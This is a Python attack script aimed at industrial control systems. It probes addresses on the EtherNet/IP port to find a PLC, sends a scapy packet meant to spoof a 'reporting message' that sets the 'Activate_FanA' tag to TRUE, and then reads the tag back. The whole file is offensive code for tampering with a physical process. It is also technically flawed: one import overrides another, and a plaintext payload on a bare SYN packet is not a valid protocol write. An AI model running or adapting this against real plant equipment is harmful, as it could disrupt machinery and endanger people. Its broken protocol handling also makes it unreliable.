import scapy.all as scapy
from scapy.layers.inet import IP, TCP
from scapy.layers.l2 import Ether
from scapy.layers.netflow import IP
import socket
from cpppo.server.enip import client

# Define the IP address of the PLC
plc_ip = None

# Function to find the PLC's IP address if it's not known
def find_plc_ip():
    # This could involve scanning the network or using a discovery protocol
    # For simplicity, let's assume you have a list of potential IPs
    potential_ips = ['192.168.1.1', '192.168.1.2']
    for ip in potential_ips:
        # Send a discovery packet and check for a response
        # This step is highly dependent on the specific protocol and device
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((ip, 44818))  # 44818 is the default port for EtherNet/IP
            if result == 0:
                return ip
            sock.close()
        except socket.error:
            pass
    return None

# Function to spoof a reporting message
def spoof_reporting_message(message):
    global plc_ip
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Create a packet to spoof the reporting message
        packet = IP(dst=plc_ip)/TCP(dport=44818, flags="S")/message
        
        # Send the packet to the PLC
        scapy.send(packet, verbose=0)
        
        print("Reporting message spoofed")
    else:
        print("PLC IP address not found")

# Function to create a spoofed reporting message
def create_spoofed_message(tag, value):
    # Create a spoofed reporting message
    message = f"{tag}={value}"
    
    return message

# Main function to start the spoofing process
def main():
    global plc_ip
    plc_ip = find_plc_ip()
    if plc_ip:
        print("PLC IP address:", plc_ip)
        
        # Create a spoofed reporting message for the 'Activate_FanA' tag
        message = create_spoofed_message("Activate_FanA", "TRUE")
        
        # Spoof the reporting message
        spoof_reporting_message(message)
        
        # Create an EtherNet/IP client
        with client.connector(host=plc_ip) as conn:
            # Read the 'Activate_FanA' tag
            activate_fan_a_value = conn.read(['Activate_FanA'])
            print("Activate_FanA value:", activate_fan_a_value)
    else:
        print("PLC IP address not found")

if __name__ == "__main__":
    main()